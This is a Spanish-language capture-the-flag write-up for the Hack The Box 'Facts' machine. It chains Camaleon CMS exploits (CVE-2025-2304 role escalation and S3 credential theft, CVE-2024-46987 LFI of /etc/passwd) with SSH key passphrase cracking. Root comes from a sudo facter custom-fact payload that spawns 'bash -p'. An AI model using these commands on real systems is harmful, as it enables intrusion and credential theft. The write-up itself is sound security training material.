# 🗂️ Facts — Writeup HTB

> [!info] 📋 Información de la Máquina
> **🖥️ OS:** Linux
> **🎯 IP:** 10.129.17.52
> **💀 Dificultad:** Fácil
> **🌐 Plataforma:** Hack The Box

---

## 🔍 Reconocimiento y Enumeración

### Verificación de conectividad y detección de OS

Antes de lanzar cualquier herramienta, verificamos que tenemos conectividad con la máquina objetivo mediante un ping. El valor del **TTL (Time To Live)** de la respuesta nos da una pista inmediata sobre el sistema operativo subyacente: cada paquete IP nace con un TTL inicial que se decrementa en 1 por cada salto (router) que atraviesa. Windows establece un TTL inicial de **128** y Linux de **64**. Como en HTB habitualmente hay un salto entre nosotros y la máquina, los valores reales suelen ser **127** (Windows) o **63** (Linux).

> [!tip] Verificar conectividad y detectar OS por TTL
> ```bash
> ping -c 1 10.129.17.52
> ```
> `-c 1` — Envía **un único paquete ICMP** y termina, evitando un ping infinito.
> `10.129.17.52` — IP objetivo.

![](/assets/Facts-img-06-03-2026-17.png)

La respuesta muestra un TTL de **63** → un salto desde el TTL inicial de 64 → estamos ante una máquina **Linux**. Confirmada la conectividad, procedemos.

---

### Enumeración con Nmap

> [!info] **Nmap (Network Mapper)**
> Herramienta de escaneo de red estándar en pentesting. Permite descubrir hosts activos, puertos abiertos, servicios en ejecución, versiones de software y ejecutar scripts de detección mediante su motor **NSE (Nmap Scripting Engine)**. Opera enviando paquetes especialmente construidos y analizando las respuestas para inferir el estado de cada puerto y el software que hay detrás.

#### Paso 1 — Escaneo de puertos completo

El objetivo es identificar **todos** los puertos abiertos de forma rápida antes de profundizar. Usamos un **SYN Scan** (half-open scan): enviamos un SYN, si recibimos SYN-ACK el puerto está abierto, pero nunca respondemos con ACK — nunca completamos el three-way handshake TCP. Esto lo hace más rápido y sigiloso que una conexión completa.

> [!tip] Escaneo SYN de todos los puertos con salida a archivo
> ```bash
> nmap -sS -p- --open --min-rate 5000 -n -Pn 10.129.17.52 -vvv -oN ports
> ```
> `-sS` — **SYN Scan** (half-open). Más sigiloso que `-sT`. Requiere privilegios de root.
> `-p-` — Escanea los **65535 puertos** TCP posibles, no solo los más comunes.
> `--open` — Muestra **únicamente los puertos abiertos**, descartando cerrados y filtrados.
> `--min-rate 5000` — Fuerza un mínimo de **5000 paquetes por segundo**, acelerando el escaneo.
> `-n` — Sin resolución DNS, evita latencias innecesarias.
> `-Pn` — Omite el ping previo de descubrimiento, asume el host activo directamente.
> `-vvv` — **Triple verbose**, muestra puertos abiertos en tiempo real sin esperar al final.
> `-oN ports` — Guarda el output en formato legible en el archivo `ports`.

![](/assets/Facts-img-06-03-2026.png)

El escaneo revela tres puertos abiertos: **22** (SSH), **80** (HTTP) y **54321** — un puerto no estándar cuyo servicio desconocemos por ahora. Lo anotamos para investigarlo más adelante una vez tengamos contexto de la aplicación web.

#### Paso 2 — Detección de versiones y servicios

Con los puertos identificados, lanzamos un segundo escaneo más específico para determinar qué software y versión corre en cada uno, y ejecutar los scripts NSE por defecto que pueden revelar información adicional como cabeceras HTTP, algoritmos SSH soportados o redirecciones.

> [!tip] Detección de versiones y scripts NSE sobre los puertos descubiertos
> ```bash
> nmap -sC -sV -p22,80,54321 --min-rate 5000 -n -Pn -vvv 10.129.17.52 -oN version
> ```
> `-sC` — Ejecuta los **scripts NSE por defecto**: detección de servicios, enumeración básica, información de certificados, cabeceras HTTP, etc.
> `-sV` — **Detección de versiones**: intenta identificar el software y versión exacta de cada servicio.
> `-p22,80,54321` — Limita el escaneo a los **puertos descubiertos** en el paso anterior.
> `--min-rate 5000` — Mínimo de 5000 paquetes por segundo.
> `-n` — Sin resolución DNS.
> `-Pn` — Sin ping previo.
> `-vvv` — Triple verbose.
> `-oN version` — Guarda el output en el archivo `version`.

![](/assets/Facts-img-06-03-2026-1.png)
![](/assets/Facts-img-06-03-2026-2.png)
![](/assets/Facts-img-06-03-2026-3.png)

El resultado más relevante: el puerto 80 sirve una aplicación web que intenta **redirigir al dominio `http://facts.htb`**. Esto indica que el servidor usa **Virtual Hosting** — técnica por la que un mismo servidor web sirve diferentes sitios según la cabecera `Host` de la petición HTTP. Si accedemos por IP directamente, el servidor no resuelve a qué sitio servirnos y devuelve un error o redirección. Necesitamos registrar el dominio localmente.

---

### Virtual Hosting — Configuración de /etc/hosts

> [!info] **/etc/hosts**
> Archivo del sistema operativo que mapea nombres de dominio a direcciones IP localmente, antes de consultar ningún servidor DNS externo. Tiene prioridad sobre DNS — si el dominio está aquí, el sistema lo resuelve directamente a la IP indicada sin hacer ninguna consulta de red. Es el método estándar en HTB para trabajar con máquinas que usan virtual hosting.

> [!tip] Añadir facts.htb al archivo de hosts del sistema
> ```bash
> echo "10.129.17.52 facts.htb" | sudo tee -a /etc/hosts
> ```
> `echo "10.129.17.52 facts.htb"` — Genera la línea de mapeo IP → dominio.
> `sudo tee -a /etc/hosts` — Escribe la línea al final de `/etc/hosts` con permisos de root. `-a` es append — no sobreescribe el contenido existente.

A partir de este momento, cualquier petición a `http://facts.htb` resolverá correctamente a la IP de la máquina objetivo y el servidor web sabrá a qué sitio servirnos.

---

### Fuzzing web con Gobuster

Con el dominio configurado, enumeramos directorios y archivos ocultos que no estén enlazados públicamente en la web.

> [!info] **Gobuster**
> Herramienta de fuzzing web escrita en Go. Descubre directorios, archivos y subdominios mediante fuerza bruta contra un servidor web, probando cada entrada de una wordlist como posible ruta. Es más rápida que alternativas como `dirb` o `dirbuster` gracias a su arquitectura concurrente en Go. Modos principales: `dir` para enumeración de rutas web y `dns` para subdominios.

> [!info] **SecLists**
> Colección de wordlists de referencia en seguridad ofensiva, mantenida por Daniel Miessler. Incluye listas para fuzzing web, nombres de usuario, contraseñas, payloads de inyección y más. La wordlist `directory-list-2.3-medium.txt` de DirBuster contiene más de 220.000 entradas de directorios comunes — un buen balance entre cobertura y velocidad para una primera pasada.

> [!tip] Fuzzing de directorios web con Gobuster
> ```bash
> gobuster dir -u http://facts.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --no-error -o fuzzing
> ```
> `dir` — Modo de enumeración de directorios y archivos.
> `-u http://facts.htb` — URL objetivo.
> `-w` — Wordlist a usar. La de DirBuster medium tiene buen balance entre cobertura y velocidad.
> `--no-error` — Suprime los mensajes de error, haciendo la salida más limpia y legible.
> `-o fuzzing` — Guarda todos los resultados en el archivo `fuzzing`.

![](/assets/Facts-img-06-03-2026-18.png)

Entre los resultados destaca el directorio `/admin` — un **panel de administración expuesto públicamente** sin ningún tipo de protección de acceso. Accedemos directamente desde el navegador.

---

### Exploración del panel /admin

![](/assets/Facts-img-06-03-2026-4.png)
![](/assets/Facts-img-06-03-2026-5.png)

El panel muestra un formulario de login estándar, pero con un detalle importante: **ofrece la posibilidad de crear una cuenta**. Esto es relevante porque muchas vulnerabilidades en CMS son de tipo "authenticated" — requieren estar autenticado, aunque sea con una cuenta sin privilegios. El registro abierto es en sí mismo un fallo de configuración en un panel de administración. Creamos una cuenta con credenciales controladas (`victh0r:victor`) y accedemos al panel.

---

## 💥 Explotación

### Identificación del CMS y búsqueda de exploits

![](/assets/Facts-img-06-03-2026-6.png)

Una vez autenticados, en la parte inferior de la interfaz del panel de administración se puede leer claramente el CMS utilizado y su versión: **Camaleon CMS 2.9.0**.

> [!info] **Camaleon CMS**
> Sistema de gestión de contenidos (CMS) open source construido sobre **Ruby on Rails**. Orientado a la gestión de medios y contenido web, con soporte integrado para almacenamiento en la nube mediante **AWS S3**. Su sistema de roles diferencia entre `client` (usuario estándar) y `admin` (administrador con acceso a toda la configuración). Esta separación de roles, combinada con su integración S3, lo hace especialmente interesante desde el punto de vista ofensivo: escalar de `client` a `admin` puede dar acceso a credenciales cloud almacenadas en la configuración del sitio.

Con la versión exacta identificada, buscamos `camaleon cms 2.9.0 exploit` y encontramos directamente el CVE-2025-2304. 📄 [CVE-2025-2304 PoC — Alien0ne](https://github.com/Alien0ne/CVE-2025-2304/blob/main/exploit.py)

---

### CVE-2025-2304 — Privilege Escalation + Extracción de credenciales AWS S3

> [!info] **CVE-2025-2304 — Camaleon CMS 2.9.0 Authenticated Privilege Escalation**
> Vulnerabilidad de escalada de privilegios autenticada en Camaleon CMS 2.9.0. El endpoint `/admin/users/{id}/updated_ajax` acepta peticiones PATCH para modificar datos de usuario, incluyendo el campo `password[role]`. El servidor no valida si el usuario autenticado tiene permisos para modificar su propio rol, lo que permite a cualquier usuario con rol `client` enviarse a sí mismo `password[role]=admin` y escalar a administrador instantáneamente. Una vez como admin, toda la configuración del CMS es accesible — incluyendo las credenciales de AWS S3 almacenadas en texto plano en `/admin/settings/site`.
>
> El exploit en Python automatiza el flujo completo: login → extracción del CSRF token (necesario para la petición PATCH) → modificación del rol → extracción de credenciales S3 → reversión opcional del rol.

> [!info] **CSRF Token (Cross-Site Request Forgery Token)**
> Mecanismo de seguridad web que protege contra ataques CSRF. El servidor genera un token único por sesión que debe incluirse en cada petición de modificación (POST, PATCH, DELETE). Sin él, el servidor rechaza la petición. El exploit extrae este token automáticamente del HTML de la página antes de enviar la petición de escalada.

| Parámetro | Descripción |
|---|---|
| `-u` / `--url` | URL base del CMS objetivo |
| `-U` / `--username` | Usuario con el que autenticarse |
| `-P` / `--password` | Contraseña del usuario |
| `--newpass` | Nueva contraseña temporal durante la escalada (por defecto `test`) |
| `-e` / `--extract` | Extrae las credenciales AWS S3 tras escalar a admin |
| `-r` / `--revert` | Revierte el rol al valor original tras la explotación |

> [!important] Usar siempre `-r` para revertir el rol tras la explotación. En un pentest real, dejar una cuenta de usuario con rol `admin` en un CMS de producción es un rastro evidente y puede afectar al funcionamiento del sistema. En HTB lo aplicamos por buenas prácticas.

> [!tip] Ejecutar CVE-2025-2304 para escalar a admin y extraer credenciales S3
> ```bash
> python3 exploit.py -u http://facts.htb -U victh0r2 -P victor -e -r
> ```
> `-u http://facts.htb` — URL base del CMS objetivo.
> `-U victh0r2` — Nombre del usuario registrado previamente, con rol `client`.
> `-P victor` — Contraseña del usuario.
> `-e` — Tras escalar a admin, accede a `/admin/settings/site` y extrae `access_key`, `secret_key` y `endpoint` del almacenamiento S3 configurado.
> `-r` — Revierte el rol del usuario de vuelta a `client` al finalizar.

![](/assets/Facts-img-06-03-2026-11.png)
![](/assets/Facts-img-06-03-2026-13.png)

El exploit devuelve tres datos críticos: **S3 access key**, **S3 secret key** y **endpoint** — que apunta a `http://10.129.17.52:54321`. Esto resuelve el misterio del puerto 54321 descubierto en el escaneo inicial: es una instancia de **LocalStack** (o servicio compatible con la API de AWS S3) corriendo localmente en la propia máquina objetivo. No es un servicio desconocido — es un S3 privado.

---

### Enumeración del almacenamiento S3

Con las credenciales en mano, usamos el cliente oficial de AWS para interactuar con el servicio S3 local.

> [!info] **AWS CLI (Amazon Web Services Command Line Interface)**
> Herramienta oficial de Amazon para interactuar con todos los servicios de AWS desde la terminal. Funciona igualmente con implementaciones compatibles con la API de S3 como **LocalStack**, que replica la API de AWS localmente para desarrollo y testing. El flag `--endpoint-url` redirige todas las peticiones al endpoint especificado en lugar de a los servidores reales de Amazon.

> [!info] **LocalStack**
> Herramienta open source que emula los servicios de AWS (S3, SQS, Lambda, etc.) localmente en un contenedor Docker. Se usa habitualmente en desarrollo para evitar costes de AWS y en entornos de laboratorio como HTB para simular infraestructura cloud. Expone exactamente la misma API que AWS, por lo que el cliente `aws` funciona sin modificaciones apuntando al endpoint local.

> [!info] **Amazon S3 — Buckets y objetos**
> S3 organiza los datos en **buckets** (contenedores raíz) que contienen **objetos** (archivos), opcionalmente organizados en prefijos que simulan carpetas. Un bucket llamado `internal` en un entorno corporativo es una señal inmediata de que puede contener información sensible no destinada a ser pública.

> [!tip] Listar todos los buckets S3 disponibles
> ```bash
> aws --endpoint-url http://10.129.17.52:54321 s3 ls
> ```
> `--endpoint-url http://10.129.17.52:54321` — Apunta al servicio S3 local en lugar de a AWS real.
> `s3 ls` — Lista todos los buckets accesibles con las credenciales actuales.

![](/assets/Facts-img-06-03-2026-14.png)

Hay un bucket llamado `internal`. Exploramos su contenido en profundidad:

> [!tip] Explorar el contenido del bucket internal y su carpeta .ssh
> ```bash
> aws --endpoint-url http://10.129.17.52:54321 s3 ls s3://internal
> aws --endpoint-url http://10.129.17.52:54321 s3 ls s3://internal/.ssh/
> ```
> `s3 ls s3://internal` — Lista el contenido raíz del bucket `internal`.
> `s3 ls s3://internal/.ssh/` — Lista el contenido de la carpeta `.ssh` dentro del bucket.

Encontramos un archivo `id_ed25519` — una **clave privada SSH** generada con el algoritmo **Ed25519**. Lo descargamos:

> [!tip] Descargar la clave privada SSH del bucket S3
> ```bash
> aws --endpoint-url http://10.129.17.52:54321 s3 cp s3://internal/.ssh/id_ed25519 .
> ```
> `s3 cp` — Copia un objeto de S3 al sistema local.
> `s3://internal/.ssh/id_ed25519` — Ruta completa al objeto en el bucket.
> `.` — Destino: directorio de trabajo actual.

![](/assets/Facts-img-06-03-2026-15.png)

> [!info] **Ed25519 — Clave SSH**
> Algoritmo de firma digital basado en curvas elípticas, introducido como alternativa moderna a RSA para claves SSH. Produce claves más cortas (256 bits) con seguridad equivalente o superior a RSA de 3072 bits. Las claves SSH pueden estar protegidas con una **passphrase** — una contraseña que cifra la clave privada en disco. Si la clave tiene passphrase, SSH la solicitará en cada uso. El archivo `id_ed25519` (sin extensión) es la clave privada; `id_ed25519.pub` sería la clave pública correspondiente.

Tenemos la clave, pero nos falta el **nombre de usuario**. Sin él no podemos autenticarnos por SSH.

---

### CVE-2024-46987 — LFI para obtener usuarios del sistema

Para identificar usuarios válidos del sistema, aprovechamos una segunda vulnerabilidad en Camaleon CMS. 📄 [CVE-2024-46987 — Rival420](https://github.com/Rival420/CVE-2024-46987)

> [!info] **CVE-2024-46987 — Camaleon CMS Authenticated LFI**
> Vulnerabilidad de **Local File Inclusion** en Camaleon CMS versiones anteriores a 2.8.2. El endpoint `/admin/media/download_private_file` acepta un parámetro `file` que no sanitiza correctamente las secuencias de path traversal (`../`), permitiendo leer archivos arbitrarios del servidor en el contexto del proceso de la aplicación web. Requiere autenticación, pero con cualquier cuenta válida — incluso `client` — es suficiente.

> [!info] **LFI (Local File Inclusion) y Path Traversal**
> El **path traversal** es una técnica que abusa de la falta de validación en rutas de archivo para escapar del directorio esperado usando secuencias como `../` (subir un nivel). El **LFI** es la vulnerabilidad que resulta de permitir path traversal en parámetros que determinan qué archivo se lee o incluye. En este caso, al no filtrar `../` en el parámetro `file`, se puede leer cualquier archivo del sistema que sea accesible por el usuario que ejecuta Rails — habitualmente con permisos amplios. Archivos de alto valor: `/etc/passwd`, `/etc/shadow`, claves SSH en `/home/usuario/.ssh/id_rsa`, archivos de configuración con credenciales de base de datos, código fuente de la aplicación.

El exploit requiere la **cookie `auth_token`** de nuestra sesión activa, obtenida desde el navegador (F12 → Application → Cookies → `auth_token`).

> [!tip] Leer /etc/passwd del servidor mediante LFI
> ```bash
> python3 lfi.py -u http://facts.htb -f /etc/passwd -t "iPx9FC-u6PIJnflOTcdsKg&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A140.0%29+Gecko%2F20100101+Firefox%2F140.0&10.10.16.198"
> ```
> `-u http://facts.htb` — URL base del CMS objetivo.
> `-f /etc/passwd` — Archivo del servidor a leer. Contiene la lista de todos los usuarios del sistema con su UID, GID, directorio home y shell asignada.
> `-t` — Valor completo de la cookie `auth_token` de la sesión autenticada. Se obtiene desde las DevTools del navegador.

![](/assets/Facts-img-06-03-2026-16.png)

> [!info] **/etc/passwd — Estructura**
> Cada línea del archivo representa un usuario con el formato: `usuario:x:UID:GID:comentario:home:shell`. El campo `x` indica que la contraseña está en `/etc/shadow`. Los usuarios con `/bin/bash` o `/bin/sh` como shell son usuarios interactivos reales. Los que tienen `/usr/sbin/nologin` o `/bin/false` son cuentas de servicio sin acceso de login.

Del contenido del `/etc/passwd` extraemos los usuarios con shell interactiva: **trivia** y **william**. Ambos son candidatos para la clave SSH descargada.

---

### Acceso SSH como trivia

Con dos usuarios candidatos y una clave privada, probamos ambos. Al intentar con `trivia`, SSH acepta la clave pero solicita **passphrase** — confirmando que la clave pertenece a este usuario pero está cifrada en disco.

> [!tip] Ajustar permisos e intentar conexión SSH con la clave descargada
> ```bash
> chmod 600 id_ed25519
> ssh -i id_ed25519 trivia@10.129.17.52
> ```
> `chmod 600 id_ed25519` — Permisos `rw-------`: solo lectura/escritura para el propietario. SSH rechaza claves con permisos más abiertos (por ejemplo `644`) emitiendo el error `Permissions too open` — es una medida de seguridad del cliente SSH para proteger claves privadas.
> `-i id_ed25519` — Especifica la clave privada a usar para autenticación en lugar de la del sistema.
> `trivia@10.129.17.52` — Usuario y host destino.

El servidor pide passphrase → necesitamos crackearla.

---

### Crackeo de la passphrase con John the Ripper

> [!info] **John the Ripper**
> Herramienta de crackeo de contraseñas y hashes open source. Soporta más de 400 formatos distintos incluyendo hashes de sistema Linux/Windows, passphrases de claves SSH, archivos ZIP/RAR/KeePass, tickets Kerberos y mucho más. Para crackear claves SSH, utiliza la herramienta auxiliar `ssh2john` que convierte la clave cifrada a un formato de hash que John puede atacar con diccionario o fuerza bruta.

> [!info] **ssh2john**
> Herramienta auxiliar incluida con John the Ripper que extrae los parámetros de cifrado de una clave privada SSH y los convierte al formato interno de John (`$sshng$...`). Es el paso obligatorio previo a cualquier ataque de crackeo contra claves SSH — John no puede procesar directamente el formato PEM de una clave SSH.

> [!tip] Convertir la clave SSH a hash crackeable y atacar con diccionario
> ```bash
> ssh2john id_ed25519 > hash_ssh
> john hash_ssh --wordlist=/usr/share/wordlists/rockyou.txt
> ```
> `ssh2john id_ed25519` — Extrae el hash de la clave cifrada y lo vuelca en formato John al archivo `hash_ssh`.
> `john hash_ssh` — Lanza el ataque de crackeo contra el hash generado.
> `--wordlist=/usr/share/wordlists/rockyou.txt` — Usa RockYou, una wordlist de 14+ millones de contraseñas reales filtradas de brechas anteriores. Es la wordlist estándar en CTFs por su alta tasa de éxito en contraseñas comunes.

![](/assets/Facts-img-06-03-2026-19.png)

John encuentra la passphrase: **`dragonballz`**. Con ella ya podemos autenticarnos:

> [!tip] Conectarse por SSH con la clave y la passphrase crackeada
> ```bash
> ssh -i id_ed25519 trivia@10.129.17.52
> ```
> Al solicitar la passphrase, introducir `dragonballz`.

![](/assets/Facts-img-06-03-2026-20.png)

Estamos dentro como `trivia`. La **user flag** no está en el home de trivia sino en el del usuario `william`. Sin embargo, los permisos del directorio home de william permiten lectura a otros usuarios, por lo que podemos acceder directamente:

> [!tip] Leer la user flag desde el home de william
> ```bash
> cat /home/william/Desktop/user.txt
> ```

![](/assets/Facts-img-06-03-2026-21.png)

User flag obtenida. Procedemos a la escalada de privilegios.

---

## 🔼 Escalada de Privilegios

### Enumeración de permisos sudo

El primer vector a comprobar siempre es `sudo -l` — qué comandos puede ejecutar el usuario actual como root sin contraseña. Es rápido, no genera ruido y frecuentemente revela el path de escalada directamente.

> [!tip] Listar permisos sudo del usuario actual
> ```bash
> sudo -l
> ```
> Muestra los binarios y comandos que el usuario actual puede ejecutar con `sudo`, con qué usuario destino y si requiere contraseña. La línea `(ALL) NOPASSWD: /ruta/binario` es el hallazgo más valioso — ejecución como root sin contraseña.

![](/assets/Facts-img-06-03-2026-23.png)

El output muestra que `trivia` puede ejecutar `/usr/bin/facter` como root sin contraseña.

---

### Abuso de facter para ejecución de código como root

> [!info] **facter**
> Herramienta del ecosistema **Puppet** (gestión de configuración) que recopila información del sistema (facts) como OS, hardware, red, memoria, etc. y los expone en formato estructurado. Su característica clave desde el punto de vista ofensivo es el flag `--custom-dir`, que permite especificar un **directorio con facts personalizados escritos en Ruby**. Facter cargará y ejecutará cualquier archivo `.rb` en ese directorio — y si se ejecuta como root vía sudo, el código Ruby también correrá como root. Esto convierte a facter en un vector de ejecución de código arbitrario trivial cuando está en sudoers sin restricciones.

> [!info] **Ruby — Método system()**
> `system()` es un método de Ruby que ejecuta comandos del sistema operativo directamente, similar a `os.system()` en Python. Al llamarlo desde un fact de facter que corre como root, el comando se ejecuta con los privilegios máximos del sistema.

**Paso 1 — Crear el fact malicioso en Ruby**

Creamos el archivo `pwn.rb` con un fact que ejecuta un comando del sistema. Primero probamos con `whoami` para verificar que la ejecución ocurre como root antes de lanzar el payload final:
```ruby
Facter.add(:pwn) do
  setcode do
    system("whoami")
    "ok"
  end
end
```

> [!info] **Estructura de un Facter custom fact**
> `Facter.add(:nombre)` — Registra un nuevo fact con el nombre especificado (`:pwn` en este caso).
> `setcode do ... end` — Bloque que define cómo se calcula el valor del fact. El código Ruby dentro de este bloque se ejecuta cuando facter evalúa el fact.
> `system("comando")` — Ejecuta el comando en el sistema operativo en el contexto del proceso de facter — en este caso, root.
> `"ok"` — Valor de retorno del fact (lo que facter mostrará como valor de `:pwn`). No tiene relevancia ofensiva, es simplemente el valor que facter reporta.

**Paso 2 — Crear el directorio y colocar el archivo**

> [!tip] Crear la estructura de directorios y escribir el fact malicioso
> ```bash
> mkdir -p /tmp/facter/facter
> nano /tmp/facter/facter/pwn.rb
> ```
> `mkdir -p /tmp/facter/facter` — Crea los directorios necesarios. `/tmp` es escribible por todos los usuarios — no requiere privilegios.
> `nano pwn.rb` — Edita el archivo e introduce el código Ruby del fact. También puede usarse `vim` o `echo` para escribirlo directamente.

**Paso 3 — Ejecutar facter con el directorio personalizado (prueba con whoami)**

> [!tip] Ejecutar facter con el custom fact apuntando al directorio creado
> ```bash
> sudo /usr/bin/facter --custom-dir=/tmp/facter/facter pwn.rb
> ```
> `sudo /usr/bin/facter` — Ejecuta facter como root gracias al permiso sudo sin contraseña.
> `--custom-dir=/tmp/facter/facter` — Indica a facter el directorio donde buscar facts personalizados. Cargará y ejecutará todos los archivos `.rb` presentes en ese directorio.
> `pwn.rb` — Nombre del fact a evaluar (sin extensión).

![](/assets/Facts-img-06-03-2026-22.png)

La salida muestra `root` como resultado del `whoami` — confirmando ejecución de comandos como root. El vector funciona.

**Paso 4 — Modificar el payload para obtener shell de root**

Modificamos el `system()` del fact para lanzar una bash interactiva con privilegios elevados:
```ruby
Facter.add(:pwn) do
  setcode do
    system("/bin/bash -p")
    "ok"
  end
end
```

> [!info] **bash -p (Modo privilegiado)**
> El flag `-p` de bash activa el **modo privilegiado**, que preserva el UID efectivo (EUID) del proceso padre en lugar de resetearlo al UID real del usuario. Cuando un proceso con EUID=0 (root) lanza bash, `-p` garantiza que la shell resultante mantiene los privilegios de root en lugar de descartarlos. Sin `-p`, bash puede resetear el EUID al UID real por seguridad.

> [!tip] Ejecutar facter con el payload final para obtener shell de root
> ```bash
> sudo /usr/bin/facter --custom-dir=/tmp/facter/facter pwn.rb
> ```

![](/assets/Facts-img-06-03-2026-24.png)
![](/assets/Facts-img-06-03-2026-25.png)

Obtenemos una shell interactiva como `root`. La máquina está comprometida completamente:

> [!tip] Leer la root flag
> ```bash
> cat /root/root.txt
> ```

---

## 📝 Lecciones Aprendidas

**Registro abierto en panel de administración** — El panel `/admin` permitía crear cuentas libremente. En producción, el registro en un panel de administración debe estar deshabilitado o protegido. La cuenta de bajo privilegio fue suficiente para encadenar dos CVEs.

**Encadenamiento de vulnerabilidades** — Ninguno de los dos CVEs por separado habría sido suficiente para el acceso inicial completo. CVE-2025-2304 dio acceso admin y credenciales S3. CVE-2024-46987 dio los usuarios del sistema. La clave SSH enlazó ambos. Este patrón de encadenamiento es habitual en entornos reales.

**Credenciales cloud en texto plano** — Las credenciales de AWS S3 estaban almacenadas en la configuración del CMS accesibles desde el panel de administración. En entornos reales esto representa un riesgo crítico — un atacante con acceso admin al CMS obtiene acceso a toda la infraestructura cloud asociada.

**Material sensible en almacenamiento S3** — El bucket `internal` contenía claves SSH privadas. Los buckets S3 (locales o en AWS real) no deben usarse para almacenar material criptográfico a menos que estén cifrados y con acceso estrictamente controlado.

**sudo sin contraseña sobre binarios con ejecución de código** — `facter` con `--custom-dir` es equivalente a tener sudo sobre un intérprete Ruby. Cualquier binario que permita cargar y ejecutar código arbitrario (intérpretes, herramientas con plugins, binarios con flags `--exec`, etc.) debe tratarse con el mismo nivel de riesgo que sudo sobre `/bin/bash`. Consultar GTFOBins antes de configurar sudoers.

---

## 🗺️ Resumen del Attack Path
```
Ping → TTL 63 → Linux
         ↓
Nmap → Puertos 22 (SSH), 80 (HTTP), 54321 (S3 local)
         ↓
Virtual Hosting → facts.htb en /etc/hosts
         ↓
Gobuster → /admin descubierto y accesible
         ↓
Registro de cuenta → Camaleon CMS 2.9.0 identificado
         ↓
CVE-2025-2304 → Escalada de rol client→admin + Credenciales AWS S3
         ↓
AWS CLI → Bucket internal → .ssh/id_ed25519 descargada
         ↓
CVE-2024-46987 LFI → /etc/passwd → Usuarios: trivia, william
         ↓
SSH trivia + id_ed25519 → Passphrase requerida
         ↓
ssh2john + John the Ripper → Passphrase: dragonballz → Acceso SSH
         ↓
User flag en /home/william/Desktop/user.txt (permisos de lectura)
         ↓
sudo -l → /usr/bin/facter NOPASSWD
         ↓
Custom fact Ruby con system("/bin/bash -p") → Shell root
         ↓
Root flag en /root/root.txt
```